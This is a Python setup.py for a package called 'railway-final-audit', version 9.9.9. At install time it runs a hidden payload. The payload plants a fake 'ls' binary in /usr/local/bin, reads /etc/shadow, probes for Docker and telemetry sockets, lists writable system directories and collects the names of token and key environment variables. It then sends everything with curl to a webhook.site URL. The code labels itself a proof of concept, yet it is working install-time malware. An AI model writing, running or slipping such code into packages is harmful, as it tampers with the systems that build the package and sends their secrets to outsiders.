import os
import subprocess
import json
import socket
import platform
from setuptools import setup

WEBHOOK_URL = "https://webhook.site/28e4aca1-4762-473e-86c1-b45a812532df"

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore').strip()
    except Exception as e:
        return f"Error: {str(e)}"

def build_pwn_report():

    fake_ls_path = "/usr/local/bin/ls"
    poison_status = "FAILED"
    try:
        with open(fake_ls_path, "w") as f:
            f.write("#!/bin/sh\necho '[!] WARNING: SYSTEM COMPROMISED BY BUILD ROOT'\n/bin/ls \"$@\"")
        os.chmod(fake_ls_path, 0o755)
        poison_status = "SUCCESS: Fake 'ls' injected"
    except Exception as e:
        poison_status = f"FAILED: {str(e)}"

    report = {
        "TITLE": "CRITICAL_SUPPLY_CHAIN_INTEGRITY_TEST",
        "POISON_STATUS": poison_status,
        "SENSITIVE_LEAKS": {
            "shadow": run_cmd("head -n 1 /etc/shadow"),
            "otel_socket": "PRESENT" if os.path.exists("/dev/otel-grpc.sock") else "ABSENT",
            "docker_sock": "PRESENT" if os.path.exists("/var/run/docker.sock") else "ABSENT"
        },
        "INFRA_INFO": {
            "mounts_count": len(run_cmd("mount").split('\n')),
            "writable_dirs": [d for d in ["/etc", "/usr/bin", "/lib"] if os.access(d, os.W_OK)]
        },
        "ENV_SECRET_NAMES": [k for k in os.environ.keys() if any(x in k for x in ["RAILWAY", "KEY", "AUTH", "TOKEN"])]
    }
    return report

try:
    final_report = build_pwn_report()
    payload = json.dumps(final_report)
   
   
    subprocess.run([
        'curl', '-X', 'POST',
        '-H', 'Content-Type: application/json',
        '-d', payload,
        WEBHOOK_URL
    ], timeout=10)
   
    print("\n[+] PoC Data sent to Webhook.site")
    print(f"[+] Poisoning Status: {final_report['POISON_STATUS']}")
except Exception as e:
    print(f"[-] Webhook Delivery Failed: {e}")

 
setup(name="railway-final-audit", version="9.9.9")
